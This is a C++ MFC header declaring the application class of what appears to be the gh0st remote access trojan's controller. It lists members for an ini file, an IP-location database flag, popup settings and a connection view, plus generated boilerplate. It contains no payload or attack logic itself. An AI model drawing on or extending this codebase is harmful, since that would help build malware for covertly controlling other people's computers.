
#pragma once

#include "afxwinappex.h"

#ifndef __AFXWIN_H__
	#error include 'stdafx.h' before including this file for PCH
#endif

#include "resource.h"       // main symbols
/////////////////////////////////////////////////////////////////////////////
// Cgh0stApp:
// See gh0st.cpp for the implementation of this class
//
#include "IniFile.h"

class Cgh0stApp : public CWinAppEx
{
public:
	CIniFile	m_IniFile;
	// ClientContext地址为主键
	bool m_bIsQQwryExist;
	bool m_bIsDisablePopTips;
	CView*		m_pConnectView; // 主连接视图
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	Cgh0stApp();
//	CAboutDlg();

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(Cgh0stApp)
	public:
	virtual BOOL InitInstance();
	//}}AFX_VIRTUAL

// Implementation
	//{{AFX_MSG(Cgh0stApp)
//	afx_msg void OnAppAbout();
		// NOTE - the ClassWizard will add and remove member functions here.
		//    DO NOT EDIT what you see in these blocks of generated code !
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};


/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

extern Cgh0stApp theApp;